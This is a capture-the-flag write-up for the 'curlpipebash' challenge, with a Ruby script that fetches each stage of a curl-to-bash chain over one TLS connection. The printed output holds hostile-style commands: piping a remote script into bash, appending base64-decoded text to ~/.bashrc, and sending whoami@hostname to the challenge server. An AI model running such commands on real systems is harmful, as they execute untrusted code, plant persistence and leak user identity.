# curlpipebash

## The task:

Execute this Bash command to print the flag :)

`curl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh | bash`


## solution
Lets execute first part of the command:
```
$ curl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh
curl -Ns https://curlpipebash.teaser.insomnihack.ch/03b2ae8c-ed33-48c8-ade9-c62f750e068c | bash
```

It returns another curl command. But execution of second curl command returns first:
```
$ curl -Ns https://curlpipebash.teaser.insomnihack.ch/03b2ae8c-ed33-48c8-ade9-c62f750e068c
curl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh | bash
```

Okay. Let's execute first one and look at HTTP headers:
```
$ curl -D - -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Sat, 26 Jan 2019 14:37:10 GMT
Connection: keep-alive
Transfer-Encoding: chunked

curl -Ns https://curlpipebash.teaser.insomnihack.ch/59f467b5-1b38-46c9-9237-64ea4a77488d | bash
```

`Transfer-Encoding: chunked `, piping to bash another curl command and token hint us to use the same connection.

Tried to use `openssl s_client -connect ...` but it was disconnecting before second request has sent. Perhaps I have two left hands.

Ruby solution:

```
require 'socket'
require 'openssl'

tcp_client = TCPSocket.new 'curlpipebash.teaser.insomnihack.ch', 443
context = OpenSSL::SSL::SSLContext.new
ssl_client = OpenSSL::SSL::SSLSocket.new tcp_client, context

ssl_client.connect
url = "GET /print-flag.sh HTTP/1.1\nHost: curlpipebash.teaser.insomnihack.ch\n\n"
puts "url 1: " + url
ssl_client.puts url
puts "answer 1: "
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
str = ssl_client.gets
puts str

token = str.scan(/\w+-\w+-\w+-\w+-\w+/)
puts "token: " + token.first

url = "GET /#{token.first} HTTP/1.1\nUser-Agent: curl/7.47.0\nAccept: */*\nHost: curlpipebash.teaser.insomnihack.ch\n\n"
puts "url 2: " + url
ssl_client.puts url
puts "answer 2: "
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets

url = "GET /#{token.first}/add-to-wall-of-fame/aaa%40bbb HTTP/1.1\nUser-Agent: curl/7.47.0\nAccept: */*\nHost: curlpipebash.teaser.insomnihack.ch\n\n"

puts "url 3: " + url
ssl_client.puts url
puts "answer 3: "
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
puts ssl_client.gets
```


output:
```
$ ruby /tmp/curlbash.rb
url 1: GET /print-flag.sh HTTP/1.1
Host: curlpipebash.teaser.insomnihack.ch

answer 1:
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Sat, 26 Jan 2019 14:47:45 GMT
Connection: keep-alive
Transfer-Encoding: chunked

60
curl -Ns https://curlpipebash.teaser.insomnihack.ch/a101be68-3a9b-4d39-b2ba-e9b530bc9b90 | bash
token: a101be68-3a9b-4d39-b2ba-e9b530bc9b90
url 2: GET /a101be68-3a9b-4d39-b2ba-e9b530bc9b90 HTTP/1.1
User-Agent: curl/7.47.0
Accept: */*
Host: curlpipebash.teaser.insomnihack.ch

answer 2:

81
base64  -d >> ~/.bashrc <<< ZXhwb3J0IFBST01QVF9DT01NQU5EPSdlY2hvIFRIQU5LIFlPVSBGT1IgUExBWUlORyBJTlNPTU5JSEFDSyBURUFTRVIgMjAxOScK

86
curl -Ns https://curlpipebash.teaser.insomnihack.ch/a101be68-3a9b-4d39-b2ba-e9b530bc9b90/add-to-wall-of-shame/$(whoami)%40$(hostname)
url 3: GET /a101be68-3a9b-4d39-b2ba-e9b530bc9b90/add-to-wall-of-fame/aaa%40bbb HTTP/1.1
User-Agent: curl/7.47.0
Accept: */*
Host: curlpipebash.teaser.insomnihack.ch

answer 3:

21
INS{Miss me with that fishy pipe}
0

HTTP/1.1 200 OK
```